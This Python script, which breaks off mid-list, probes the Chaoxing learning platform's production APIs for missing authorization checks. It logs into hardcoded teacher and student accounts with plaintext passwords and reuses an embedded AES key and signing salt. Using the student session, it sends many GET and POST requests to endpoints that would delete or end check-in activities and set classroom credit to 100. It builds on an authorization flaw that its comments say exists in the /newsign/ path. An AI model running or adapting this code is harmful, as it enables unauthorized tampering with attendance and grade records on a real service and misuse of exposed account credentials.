#!/usr/bin/env python3
"""
超星学习通 - 课堂积分修改 & 删除签到活动 深入探索脚本 (第5轮)
策略：
1. 正确访问课程页面提取JS源码中的API端点
2. 基于/newsign/漏洞模式(权限缺失)测试更多创意API路径
3. 测试/ppt/activeAPI/下的更多端点
4. 尝试mooc1-api下的积分相关路径
5. 使用Web登录方式访问课程管理页面
"""

import requests
import json
import re
import time
import urllib3
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# === 配置 ===
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

# AES加密
AES_KEY = "u2oh6Vu^HWe4_AES"
AES_IV = AES_KEY

def aes_enc(text):
    key = AES_KEY.encode()
    iv = AES_IV.encode()
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(text.encode(), 16)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode()

# 移动端UA
def get_mobile_ua():
    return ("Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 "
            "ChaoXingStudy/ChaoXingStudy_3_6.1_android_phone_202204251840_27")

# schild签名
def get_schild(url_path, ts):
    salt = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
    raw = f"{url_path}_{ts}_{salt}"
    return hashlib.md5(raw.encode()).hexdigest()

# 移动端登录
def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={
        "fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
        "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
        "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
        "independentId": "0", "independentNameId": "0"
    }, allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# Web登录
def web_login(phone, pwd):
    s = requests.Session()
    s.verify = False
    web_ua = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
              "Chrome/148.0.0.0 Safari/537.36 Edg/148.0.0.0")
    s.headers.update({"User-Agent": web_ua})
    s.post(LOGIN_URL, data={
        "fid": "-1", "uname": phone, "password": pwd,
        "refer": "http://i.mooc.chaoxing.com", "t": "true",
        "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0"
    }, headers={"X-Requested-With": "XMLHttpRequest"},
        allow_redirects=False, timeout=30)
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    return s

def safe_get(session, url, desc="", timeout=15):
    try:
        r = session.get(url, timeout=timeout, allow_redirects=True, verify=False)
        return {"desc": desc, "url": url, "status": r.status_code, "text": r.text[:500], "len": len(r.text)}
    except Exception as e:
        return {"desc": desc, "url": url, "status": -1, "text": str(e)[:200], "len": 0}

def safe_post(session, url, data=None, desc="", timeout=15):
    try:
        r = session.post(url, data=data, timeout=timeout, allow_redirects=True, verify=False)
        return {"desc": desc, "url": url, "status": r.status_code, "text": r.text[:500], "len": len(r.text)}
    except Exception as e:
        return {"desc": desc, "url": url, "status": -1, "text": str(e)[:200], "len": 0}

def get_active_list(session, course_id, class_id, uid):
    url = f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist"
    params = {"courseId": course_id, "classId": class_id, "uid": uid}
    try:
        r = session.get(url, params=params, timeout=20, verify=False)
        data = r.json()
        return data.get("activeList", [])
    except:
        return []

def main():
    results = {}
    print("=" * 80)
    print("超星学习通 - 课堂积分修改 & 删除签到活动 深入探索 (第5轮)")
    print("=" * 80)

    # === 登录 ===
    print("\n[*] 登录教师账号...")
    t_session, t_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    教师PUID: {t_puid}")

    print("[*] 登录学生账号...")
    s_session, s_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    学生PUID: {s_puid}")

    # Web登录
    print("[*] Web登录教师账号...")
    tw_session = web_login(TEACHER_PHONE, TEACHER_PWD)
    print("[*] Web登录学生账号...")
    sw_session = web_login(STUDENT_PHONE, STUDENT_PWD)

    # === 获取活动列表 ===
    print("\n[*] 获取活动列表...")
    active_list = get_active_list(t_session, COURSE_ID, CLASS_ID, t_puid)
    sign_activities = []
    for item in active_list:
        if item.get("activeType") == 2 or "sign" in str(item.get("url", "")).lower():
            sign_activities.append(item)
            print(f"    签到活动: aid={item.get('id', 'N/A')}, name={item.get('nameOne', 'N/A')}, "
                  f"status={item.get('status', 'N/A')}, type={item.get('activeType', 'N/A')}")

    # 获取一个有效的aid
    test_aid = None
    for act in sign_activities:
        test_aid = act.get("id")
        if test_aid:
            break

    if not test_aid and active_list:
        test_aid = active_list[0].get("id")

    print(f"\n[*] 使用测试活动ID: {test_aid}")

    # =============================================
    # 第1部分: 访问课程页面提取JS源码中的API端点
    # =============================================
    print("\n" + "=" * 80)
    print("第1部分: 访问课程页面提取JS源码中的API端点")
    print("=" * 80)

    course_page_urls = [
        # 教师课程管理页面
        f"https://mooc1.chaoxing.com/mycourse/teacherstudy?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/course/{COURSE_ID}.html",
        f"https://mooc1.chaoxing.com/mycourse/stu?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 学生课程页面
        f"https://mooc1.chaoxing.com/mycourse/studentstudy?courseId={COURSE_ID}&classId={CLASS_ID}",
        # i.chaoxing.com
        f"https://i.chaoxing.com/mycourse/studentstudy?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 课堂互动页面
        f"https://mooc1.chaoxing.com/classroomCredit?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/mycourse/credit?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 积分页面
        f"https://mooc1.chaoxing.com/point?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1-api.chaoxing.com/mooc-ans/point?courseId={COURSE_ID}&classId={CLASS_ID}",
    ]

    js_api_endpoints = set()
    page_results = []

    for url in course_page_urls:
        # 用教师Web session访问
        r = safe_get(tw_session, url, f"教师Web-{url.split('chaoxing.com')[1][:60]}")
        page_results.append(r)
        print(f"  [{r['status']}] {r['desc']} (len={r['len']})")

        # 提取JS文件URL
        if r['status'] == 200 and r['len'] > 500:
            try:
                full_text = tw_session.get(url, timeout=20, verify=False).text
                # 提取JS文件
                js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', full_text)
                for js_url in js_urls:
                    if not js_url.startswith("http"):
                        if js_url.startswith("//"):
                            js_url = "https:" + js_url
                        elif js_url.startswith("/"):
                            base = url.split("chaoxing.com")[0] + "chaoxing.com"
                            js_url = base + js_url
                    print(f"    发现JS: {js_url[:80]}")
                    # 获取JS内容搜索API端点
                    try:
                        js_resp = tw_session.get(js_url, timeout=10, verify=False)
                        if js_resp.status_code == 200:
                            js_text = js_resp.text
                            # 搜索积分/credit/point/score相关API
                            credit_patterns = [
                                r'["\']([^"\']*(?:credit|Credit|CREDIT|point|Point|score|Score)[^"\']*)["\']',
                                r'["\'](/[^"\']*(?:credit|point|score|积分)[^"\']*)["\']',
                                r'url:\s*["\']([^"\']+)["\']',
                                r'api\s*[:=]\s*["\']([^"\']+)["\']',
                            ]
                            for pattern in credit_patterns:
                                matches = re.findall(pattern, js_text)
                                for m in matches:
                                    if any(kw in m.lower() for kw in ['credit', 'point', 'score', '积分', 'sign', 'active', 'delete', 'end']):
                                        js_api_endpoints.add(m)
                                        print(f"      发现API: {m}")
                    except:
                        pass
            except Exception as e:
                print(f"    JS提取失败: {e}")

    results["page_access"] = page_results
    results["js_api_endpoints"] = list(js_api_endpoints)
    print(f"\n[*] 从JS中提取到的API端点: {len(js_api_endpoints)}")
    for ep in js_api_endpoints:
        print(f"    {ep}")

    # =============================================
    # 第2部分: 基于/newsign/漏洞模式测试创意API路径
    # =============================================
    print("\n" + "=" * 80)
    print("第2部分: 基于/newsign/漏洞模式测试创意API路径")
    print("=" * 80)

    # 核心思路: /newsign/ 路径缺少权限校验，类似模式可能存在于其他路径
    # 已知: /pptSign/updateSignStatus 有权限校验, /newsign/updateSignStatus 没有
    # 推测: /pptSign/endSign 有权限校验, /newsign/endSign 可能没有(但之前返回500)
    # 新思路: 可能需要不同的参数格式或DB_STRATEGY

    db_strategy = "PRIMARY_KEY"

    # 2.1 测试 /newsign/ 路径下的各种端点 (带DB_STRATEGY)
    newsign_endpoints = [
        # 删除/结束相关
        f"/newsign/deleteSign?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/newsign/deleteActive?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/newsign/endSign?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/newsign/endActive?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/newsign/cancelSign?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/newsign/cancelActive?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/newsign/closeSign?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/newsign/stopSign?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/newsign/removeSign?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/newsign/delSign?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/newsign/delActive?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        # 积分相关
        f"/newsign/updateCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100&DB_STRATEGY={db_strategy}",
        f"/newsign/addCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100&DB_STRATEGY={db_strategy}",
        f"/newsign/modifyCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100&DB_STRATEGY={db_strategy}",
        f"/newsign/classroomCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&DB_STRATEGY={db_strategy}",
        f"/newsign/getCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&DB_STRATEGY={db_strategy}",
        f"/newsign/setCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100&DB_STRATEGY={db_strategy}",
        f"/newsign/saveCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100&DB_STRATEGY={db_strategy}",
        f"/newsign/creditLog?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&DB_STRATEGY={db_strategy}",
        f"/newsign/pointLog?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&DB_STRATEGY={db_strategy}",
        # 状态修改相关 (类似updateSignStatus的模式)
        f"/newsign/updateActiveStatus?activeId={test_aid}&status=0&DB_STRATEGY={db_strategy}",
        f"/newsign/updateSignInfo?activeId={test_aid}&status=1&DB_STRATEGY={db_strategy}",
        f"/newsign/updateSignResult?activeId={test_aid}&uid={s_puid}&status=1&DB_STRATEGY={db_strategy}",
        f"/newsign/modifySignStatus?activeId={test_aid}&uid={s_puid}&status=1&DB_STRATEGY={db_strategy}",
        f"/newsign/setSignStatus?activeId={test_aid}&uid={s_puid}&status=1&DB_STRATEGY={db_strategy}",
    ]

    base_domains = [
        "https://mooc1-api.chaoxing.com/mooc-ans",
        "https://mobilelearn.chaoxing.com",
    ]

    newsign_results = []
    for domain in base_domains:
        print(f"\n  域名: {domain}")
        for ep in newsign_endpoints:
            url = domain + ep
            # 学生测试
            r = safe_get(s_session, url, f"学生-{ep.split('?')[0].split('/')[-1]}")
            newsign_results.append(r)
            status_mark = "!!!" if r['status'] == 200 and r['len'] > 10 else "   "
            print(f"  {status_mark} [{r['status']}] {r['desc']} (len={r['len']}) {r['text'][:80]}")

    results["newsign_endpoints"] = newsign_results

    # =============================================
    # 第3部分: /ppt/activeAPI/ 下的更多端点
    # =============================================
    print("\n" + "=" * 80)
    print("第3部分: /ppt/activeAPI/ 下的更多端点")
    print("=" * 80)

    active_api_endpoints = [
        # 删除/结束活动
        f"/ppt/activeAPI/deleteActive?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/activeAPI/delActive?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/activeAPI/endActive?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/activeAPI/stopActive?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/activeAPI/cancelActive?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/activeAPI/removeActive?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/activeAPI/closeActive?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        # 积分相关
        f"/ppt/activeAPI/updateCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"/ppt/activeAPI/addCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"/ppt/activeAPI/getCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/ppt/activeAPI/classroomCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/ppt/activeAPI/creditLog?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/ppt/activeAPI/pointLog?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/ppt/activeAPI/scoreLog?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        # 活动信息
        f"/ppt/activeAPI/activeInfo?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/activeAPI/signInfo?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/ppt/activeAPI/signList?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
    ]

    active_api_results = []
    for ep in active_api_endpoints:
        url = "https://mobilelearn.chaoxing.com" + ep
        # 学生测试
        r = safe_get(s_session, url, f"学生-{ep.split('?')[0].split('/')[-1]}")
        active_api_results.append(r)
        status_mark = "!!!" if r['status'] == 200 and r['len'] > 10 else "   "
        print(f"  {status_mark} [{r['status']}] {r['desc']} (len={r['len']}) {r['text'][:80]}")

        # 教师对比测试 (仅删除/结束相关)
        if any(kw in ep for kw in ['delete', 'del', 'end', 'stop', 'cancel', 'remove', 'close']):
            r_t = safe_get(t_session, url, f"教师-{ep.split('?')[0].split('/')[-1]}")
            active_api_results.append(r_t)
            print(f"      教师: [{r_t['status']}] {r_t['desc']} (len={r_t['len']}) {r_t['text'][:80]}")

    results["active_api_endpoints"] = active_api_results

    # =============================================
    # 第4部分: mooc1-api 积分相关路径探索
    # =============================================
    print("\n" + "=" * 80)
    print("第4部分: mooc1-api 积分相关路径探索")
    print("=" * 80)

    credit_paths = [
        # 课堂积分
        f"/mooc-ans/classroomCredit/getCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/classroomCredit/updateCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"/mooc-ans/classroomCredit/addCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"/mooc-ans/classroomCredit/modifyCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"/mooc-ans/classroomCredit/setCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"/mooc-ans/classroomCredit/saveCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"/mooc-ans/classroomCredit/creditLog?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/classroomCredit/list?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/classroomCredit/detail?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        # 积分(通用)
        f"/mooc-ans/credit/getCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/credit/updateCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"/mooc-ans/credit/addCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"/mooc-ans/credit/log?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/credit/list?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        # 课堂表现
        f"/mooc-ans/classroomScore/getScore?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/classroomScore/updateScore?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&score=100",
        f"/mooc-ans/classroomScore/addScore?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&score=100",
        # 互动积分
        f"/mooc-ans/interaction/credit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/interaction/score?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/interaction/point?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        # 课堂活动积分
        f"/mooc-ans/activeCredit/getCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/activeCredit/updateCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        f"/mooc-ans/activeCredit/addCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100",
        # mycourse下的积分
        f"/mooc-ans/mycourse/credit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/mycourse/score?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/mycourse/point?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        # v2/apis 路径
        f"/mooc-ans/v2/apis/classroomCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/v2/apis/credit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        f"/mooc-ans/v2/apis/score?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}",
        # 删除签到活动
        f"/mooc-ans/active/delete?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/mooc-ans/active/end?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/mooc-ans/active/cancel?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/mooc-ans/sign/delete?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/mooc-ans/sign/end?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
        f"/mooc-ans/sign/cancel?activeId={test_aid}&courseId={COURSE_ID}&classId={CLASS_ID}",
    ]

    credit_results = []
    for ep in credit_paths:
        url = "https://mooc1-api.chaoxing.com" + ep
        # 学生测试
        r = safe_get(s_session, url, f"学生-{ep.split('?')[0].split('/')[-1]}")
        credit_results.append(r)
        status_mark = "!!!" if r['status'] == 200 and r['len'] > 10 else "   "
        print(f"  {status_mark} [{r['status']}] {r['desc']} (len={r['len']}) {r['text'][:80]}")

    results["credit_paths"] = credit_results

    # =============================================
    # 第5部分: 教师端课堂积分操作 (通过Web页面)
    # =============================================
    print("\n" + "=" * 80)
    print("第5部分: 教师端课堂积分操作 (通过Web页面)")
    print("=" * 80)

    # 尝试访问教师课堂管理页面
    teacher_urls = [
        f"https://mooc1.chaoxing.com/mycourse/teacherstudy?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/teacherstudy?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/mycourse/stu?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/classroomCredit?courseId={COURSE_ID}&classId={CLASS_ID}&teacher=1",
        f"https://mooc1.chaoxing.com/point/teacher?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/credit/teacher?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 课堂互动管理
        f"https://mooc1.chaoxing.com/interaction?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/interaction/teacher?courseId={COURSE_ID}&classId={CLASS_ID}",
        # 活动管理
        f"https://mooc1.chaoxing.com/activeManage?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/activity?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://mooc1.chaoxing.com/signManage?courseId={COURSE_ID}&classId={CLASS_ID}",
    ]

    teacher_page_results = []
    for url in teacher_urls:
        r = safe_get(tw_session, url, f"教师Web-{url.split('chaoxing.com')[1][:60]}")
        teacher_page_results.append(r)
        status_mark = "!!!" if r['status'] == 200 and r['len'] > 500 else "   "
        print(f"  {status_mark} [{r['status']}] {r['desc']} (len={r['len']})")

        # 如果页面内容丰富，提取API端点
        if r['status'] == 200 and r['len'] > 500:
            try:
                full_text = tw_session.get(url, timeout=20, verify=False).text
                # 搜索API调用
                api_patterns = [
                    r'ajax\(["\']([^"\']+)["\']',
                    r'\.get\(["\']([^"\']+)["\']',
                    r'\.post\(["\']([^"\']+)["\']',
                    r'url\s*:\s*["\']([^"\']+)["\']',
                    r'href\s*=\s*["\']([^"\']*(?:credit|point|score|sign|active|delete|end)[^"\']*)["\']',
                ]
                for pattern in api_patterns:
                    matches = re.findall(pattern, full_text)
                    for m in matches:
                        if not m.startswith(('http://', 'https://', '//', 'javascript', '#', 'mailto')):
                            if any(kw in m.lower() for kw in ['credit', 'point', 'score', 'sign', 'active', 'delete', 'end', 'api']):
                                print(f"    发现API: {m}")
                                js_api_endpoints.add(m)
            except:
                pass

    results["teacher_pages"] = teacher_page_results

    # =============================================
    # 第6部分: 尝试POST方式测试关键端点
    # =============================================
    print("\n" + "=" * 80)
    print("第6部分: POST方式测试关键端点")
    print("=" * 80)

    post_tests = [
        # /newsign/ 路径 POST测试
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/deleteSign",
            "data": {"activeId": test_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "DB_STRATEGY": db_strategy},
            "desc": "学生-newsign/deleteSign-POST"
        },
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/endSign",
            "data": {"activeId": test_aid, "courseId": COURSE_ID, "classId": CLASS_ID, "DB_STRATEGY": db_strategy},
            "desc": "学生-newsign/endSign-POST"
        },
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/updateCredit",
            "data": {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "credit": "100", "DB_STRATEGY": db_strategy},
            "desc": "学生-newsign/updateCredit-POST"
        },
        {
            "url": f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/classroomCredit",
            "data": {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "DB_STRATEGY": db_strategy},
            "desc": "学生-newsign/classroomCredit-POST"
        },
        # /ppt/activeAPI/ POST测试
        {
            "url": f"https://mobilelearn.chaoxing.com/ppt/activeAPI/deleteActive",
            "data": {"activeId": test_aid, "courseId": COURSE_ID, "classId": CLASS_ID},
            "desc": "学生-activeAPI/deleteActive-POST"
        },
        {
            "url": f"https://mobilelearn.chaoxing.com/ppt/activeAPI/endActive",
            "data": {"activeId": test_aid, "courseId": COURSE_ID, "classId": CLASS_ID},
            "desc": "学生-activeAPI/endActive-POST"
        },
        # /pptSign/ POST测试
        {
            "url": f"https://mobilelearn.chaoxing.com/pptSign/deleteSign",
            "data": {"activeId": test_aid, "courseId": COURSE_ID, "classId": CLASS_ID},
            "desc": "学生-pptSign/deleteSign-POST"
        },
        {
            "url": f"https://mobilelearn.chaoxing.com/pptSign/endSign",
            "data": {"activeId": test_aid, "courseId": COURSE_ID, "classId": CLASS_ID},
            "desc": "学生-pptSign/endSign-POST"
        },
        # 积分相关POST
        {
            "url": f"https://mobilelearn.chaoxing.com/ppt/activeAPI/updateCredit",
            "data": {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "credit": "100"},
            "desc": "学生-activeAPI/updateCredit-POST"
        },
        {
            "url": f"https://mobilelearn.chaoxing.com/ppt/activeAPI/addCredit",
            "data": {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": s_puid, "credit": "100"},
            "desc": "学生-activeAPI/addCredit-POST"
        },
    ]

    post_results = []
    for test in post_tests:
        r = safe_post(s_session, test["url"], test["data"], test["desc"])
        post_results.append(r)
        status_mark = "!!!" if r['status'] == 200 and r['len'] > 10 else "   "
        print(f"  {status_mark} [{r['status']}] {r['desc']} (len={r['len']}) {r['text'][:80]}")

        # 教师对比测试(删除/结束相关)
        if any(kw in test['desc'] for kw in ['delete', 'end', 'deleteSign', 'endSign']):
            r_t = safe_post(t_session, test["url"], test["data"], test["desc"].replace("学生", "教师"))
            post_results.append(r_t)
            print(f"      教师: [{r_t['status']}] {r_t['desc']} (len={r_t['len']}) {r_t['text'][:80]}")

    results["post_tests"] = post_results

    # =============================================
    # 第7部分: 尝试不同的域名组合
    # =============================================
    print("\n" + "=" * 80)
    print("第7部分: 尝试不同的域名组合")
    print("=" * 80)

    alt_domains = [
        "https://mooc1-1.chaoxing.com",
        "https://mooc1-2.chaoxing.com",
        "https://mooc2-ans.chaoxing.com",
        "https://mooc2.chaoxing.com",
        "https://fanya.chaoxing.com",
        "https://office.chaoxing.com",
        "https://stat.chaoxing.com",
        "https://data.xxt.aichaoxing.com",
    ]

    # 关键测试路径
    key_paths = [
        f"/mooc-ans/newsign/deleteSign?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/mooc-ans/newsign/endSign?activeId={test_aid}&DB_STRATEGY={db_strategy}",
        f"/mooc-ans/newsign/updateCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&credit=100&DB_STRATEGY={db_strategy}",
        f"/mooc-ans/newsign/classroomCredit?courseId={COURSE_ID}&classId={CLASS_ID}&uid={s_puid}&DB_STRATEGY={db_strategy}",
    ]

    domain_results = []
    for domain in alt_domains:
        print(f"\n  域名: {domain}")
        for path in key_paths:
            url = domain + path
            r = safe_get(s_session, url, f"学生-{domain.split('//')[1].split('.')[0]}-{path.split('?')[0].split('/')[-1]}")
            domain_results.append(r)
            status_mark = "!!!" if r['status'] == 200 and r['len'] > 10 else "   "
            print(f"  {status_mark} [{r['status']}] {r['desc']} (len={r['len']}) {r['text'][:80]}")

    results["domain_tests"] = domain_results

    # =============================================
    # 第8部分: 尝试通过i.chaoxing.com访问课程
    # =============================================
    print("\n" + "=" * 80)
    print("第8部分: 通过i.chaoxing.com访问课程相关页面")
    print("=" * 80)

    ichaoxing_urls = [
        f"https://i.chaoxing.com/base",
        f"https://i.chaoxing.com/space",
        f"https://i.chaoxing.com/mycourse",
        f"https://i.chaoxing.com/mycourse/backclazzdata?view=json",
        f"https://i.chaoxing.com/mycourse/stu?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://i.chaoxing.com/mycourse/teacherstudy?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://i.chaoxing.com/credit?courseId={COURSE_ID}&classId={CLASS_ID}",
        f"https://i.chaoxing.com/point?courseId={COURSE_ID}&classId={CLASS_ID}",
    ]

    ichaoxing_results = []
    for url in ichaoxing_urls:
        r = safe_get(tw_session, url, f"教师Web-i.chaoxing-{url.split('chaoxing.com')[1][:50]}")
        ichaoxing_results.append(r)
        status_mark = "!!!" if r['status'] == 200 and r['len'] > 500 else "   "
        print(f"  {status_mark} [{r['status']}] {r['desc']} (len={r['len']})")

        # 提取API
        if r['status'] == 200 and r['len'] > 500:
            try:
                full_text = tw_session.get(url, timeout=20, verify=False).text
                api_matches = re.findall(r'url\s*:\s*["\']([^"\']+)["\']', full_text)
                for m in api_matches:
                    if any(kw in m.lower() for kw in ['credit', 'point', 'score', 'sign', 'active', 'delete', 'end', 'api']):
                        print(f"    发现API: {m}")
                        js_api_endpoints.add(m)
            except:
                pass

    results["ichaoxing"] = ichaoxing_results

    # =============================================
    # 第9部分: 尝试直接通过课堂互动API
    # =============================================
    print("\n" + "=" * 80)
    print("第9部分: 课堂互动API探索")
    print("=" * 80)

    # 课堂互动相关API - 这些是教师在课堂上发活动时使用的
    interaction_endpoints = [
        # 课堂互动管理
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/startSign?courseId={COURSE_ID}&classId={CLASS_ID}&uid={t_puid}&activeType=2",
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/startActive?courseId={COURSE_ID}&classId={CLASS_ID}&uid={t_puid}&activeType=2",
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/createActive?courseId={COURSE_ID}&classId={CLASS_ID}&uid={t_puid}&activeType=2",
        # 课堂积分操作
